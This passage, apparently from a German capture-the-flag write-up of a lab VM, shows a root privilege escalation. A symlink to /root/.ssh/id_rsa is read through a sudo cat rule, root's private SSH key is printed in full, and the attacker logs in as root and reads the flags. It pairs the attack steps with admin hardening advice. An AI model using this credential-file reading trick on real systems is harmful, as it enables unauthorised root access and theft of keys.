+drwxr-xr-x 6 root     root     4096 Apr 19  2021 ..
+-rw------- 1 isabella isabella   14 Sep  6 12:06 .bash_history
+-rw-r--r-- 1 isabella isabella  220 Apr 19  2021 .bash_logout
+-rw-r--r-- 1 isabella isabella 3526 Apr 19  2021 .bashrc
+lrwxrwxrwx 1 isabella isabella   17 Sep  6 12:19 .invisible -> /root/.ssh/id_rsa  <!-- Symlink erstellt! -->
+-rw-r--r-- 1 isabella isabella  807 Apr 19  2021 .profile
+drwx------ 2 isabella isabella 4096 Apr 19  2021 .ssh
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Zurück in der Shell von `sophia`, wird der `sudo cat`-Befehl erneut ausgeführt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Wie erwartet, wird nun der Inhalt von `/root/.ssh/id_rsa` (der private SSH-Schlüssel von `root`) ausgegeben, da der Befehl dem Symlink folgt, der von `isabella` erstellt wurde. Dieser Schlüssel scheint unverschlüsselt zu sein (kein Hinweis auf Verschlüsselung im Header).
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Kopiere diesen privaten Schlüssel von `root` auf dein Angreifer-System (speichere ihn z.B. als `id_root`). Setze die Berechtigungen auf 600 (`chmod 600 id_root`) und melde dich damit als `root` per SSH an (`ssh -i id_root root@vision.hmv`).
+                <br>
+                <strong>Empfehlung (Admin):</strong> Entferne die `sudo`-Regel für `sophia`. Setze korrekte Berechtigungen für `/root/.ssh` (700) und `/root/.ssh/id_rsa` (600). Verwende idealerweise Passphrasen für Root-Schlüssel, auch wenn sie nur von Root lesbar sind.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Zurück zur sophia Shell -->
+                     <div class="prompt" style="color: #ffffff;">sophia@visions:~$ <span class="command">sudo cat /home/isabella/.invisible</span></div>
+                    <pre>
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAQEAyezVs6KCQ/KFWpEkzDWX3ns/X4lUnh6PnNC2IVg3ciVgLcWF//wb
+vlQxI+juYu5qTKVEL1FhkNaas+MlQUxabzv+SDnCck60BLQbZf46sYHQaTrDyu5zhIWWi
+wgPjmic/Ykd2qIQyIpyy9Ru4DiVK4RWLZWM28kb6eB99JTt4GSVEhraJ08hKsgai+skNg
+S4QG85kG4ghmA1yJpPwzzpIdG4HUic63Xgy+z+pVB5oIEp0YXrCKMN/lBngZjZb9/+0S1
+ljKzdcq7m1TQ1Y04YJNMrxvPJ75d8U5s+m6cRxx5F3dX7oTVmErEAxFmJjdWVChzh81Ca
+nicNjHgrQAAA8hmM8ISZjPCEgAAAAdzc2gtcnNhAAABAQDJ7NWzooJD8oVakSTMNZfeez
+9fiVSeHo+c0LYhWDdyJWAtxYX//Bu+VDEj65i7mpMpUQvUWGQ1pqz4yVBTFpvM6/5IcJ
+yTrQEtBtl/jqxgdBpsPK7nEhZaLCA+aJz9iR3aohDIinLL1G7gJUrhFYtlYzbyRvp4
+H30l3gZJUSGtonTyEqyBo6L6yQ2BLhAbzmQbiCGYDXImk/DPkh0bgdSJzrc5eDL7P6lU
+HmggSnRhesIow3+UGeBmNlv3/7RLWWMrN1yrubVM5DVjThgk0yvG88nvl3xTmz6bpxHHHk
+Xd1fuhNWYSsQDEWYmN1ZUKHHzUJo6eJw2MeCtAAAAAwEAAQAAAQEAiCmVXYHLN8h1VkIj
+vzSwiU0wydqQXeb0hIHjuqu0EVPyhAGQNHLgwV6vIqtjmxIqgbF5FYKlQclAsq1yKGpR
+AErQkb4sR4TVEyjYR6TM5mnER6YYuJysT1n667u1ogCvRDWdUpXiHGEV7ZuYdR78AYdL
+D3n15vjcsmF5JHcftHxnXraX7JqGXNCoRsMLT/yUl02ClHsjFql1NTI/Br0GA4xhM/16
+RHoRu1itlWoyF4XSpSUDHW0RVQ/0gm/GyAc9QF6EWZXHfMfW07JvkeQLlndVbnItQ9a3v
+ICAAh6zZWVXpbhCPjjfaWTnwHhhSE3vfxMQQNTJnEghnQAAAIEAjAEzb6Xp6VV1RRaJR3
+/Gxo0BRIbPJXdRXpDI3N4Nvtzv8fX3muV/i+dgYPNqa7cwheSJZX9S7RzXsZTZn1Ywbdw
+ahYTVyE9B4Nsen5gekylb59tNwPpCR8sJo6ZIL1GpmkEug+r+0YZyqpZXpG5uhCaSLX1fP
+3UnkgqiKuzpvQAAACBAlQPW6pWXvULDsiUkilMXY0SNYLupMHJuqnWTuufyNfRthPQF2
+gfWwXRjfDmzFoM9vVxJKKSd40696qbmTNnu7I4KyvXkF0Q3IXIelQIiIcDpDbYd17g47J
+IC6dHIQmUib3+whjeTvA5cc21y0EGNHoeNrlknE03dZHaIyfdPAAAAgQDjE3TE17PMEnd/
+vzau9bBYZaoRt+eYmvXFrkU/UdRwqjS/LPWxwmpLASW9x3bH/aiqNGBKeSe2k4C7MWWD5
+tllkIbNEJNDtqQNt2NRvhDUzAxca1C/IySuwoCAvoym5cpZ//EQ/vWyZRwk3enReVmmd
+x7Itf3P39SxqlP2pQwAAAAxyb290QHZpc2lvbnMBAgMEBQ==
+-----END OPENSSH PRIVATE KEY-----
+                    </pre>
+                 </div>
+            </div>
+       </section>
+
+       <section id="proof-of-concept">
+           <h2>Proof of Concept (Root Access)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Der von `sophia` ausgelesene private Schlüssel von `root` wird auf dem Angreifer-System als `idroot` gespeichert. Die Berechtigungen werden auf 600 gesetzt. Anschließend wird SSH verwendet, um sich mit diesem Schlüssel als `root` auf dem Zielsystem (`vision.hmv`) anzumelden.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der SSH-Login als `root` ist erfolgreich, da der Schlüssel korrekt ist und keine Passphrase benötigt. Fantastisch, Root-Zugriff wurde erlangt! Die mehrstufige Privilege Escalation durch Ausnutzung von `sudo`-Fehlkonfigurationen und Informationslecks (Steganographie, Schlüsselpreisgabe) war erfolgreich.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Das System ist kompromittiert. Lies die Root-Flag aus `/root/root.txt`. Dokumentiere den gesamten Angriffspfad.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Die vorherigen Empfehlungen bezüglich `sudo`-Regeln, Schlüssel- und Passwortsicherheit sind entscheidend. Führen Sie ein umfassendes Audit der Systemkonfiguration durch, um ähnliche Schwachstellen zu finden und zu beheben.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <!-- Auf Angreifer-Maschine -->
+                     <div class="prompt">┌──(root㉿cyber)-[~/HackingTools]
+└─# <span class="command">vi idroot</span></div>
+                    <pre># (Root's privater Schlüssel hier eingefügt)</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~/HackingTools]
+└─# <span class="command">chmod 600 idroot</span></div>
+                     <pre></pre> <!-- Keine Ausgabe -->
+                     <div class="prompt">┌──(root㉿cyber)-[~/HackingTools]
+└─# <span class="command">ssh -i idroot root@vision.hmv</span></div> <!-- Korrekter Hostname angenommen -->
+                     <pre>
+Linux visions 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Mon Apr 19 05:24:08 2021
+root@visions:~# <!-- Root-Login erfolgreich! -->
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Als `root` wird die Datei `/root/root.txt` ausgelesen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Root-Flag wird erfolgreich angezeigt: `<span class="password">hmvitspossible</span>`.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Beide Flags wurden gefunden. Der Test ist abgeschlossen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Sichern Sie das System gemäß den vorherigen Empfehlungen ab.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <!-- Befehle als root -->
+                    <div class="prompt" style="color: #ff0000;">root@visions:~# <span class="command">cat root.txt</span></div>
+                    <pre><span class="password">hmvitspossible</span></pre>
+                 </div>
+            </div>
+        </section>
+
+       <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">cat user.txt</div>
+                    <div class="flag-value"><span class="password">hmvicanseeforever</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat root.txt</div>
+                    <div class="flag-value"><span class="password">hmvitspossible</span></div>
+                </div>
+            </div>
+        </section>
+
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 19. April 2021</p> <!-- Extrahiertes Datum aus ls -la / john -->
+    </footer>
+</body>
+</html>
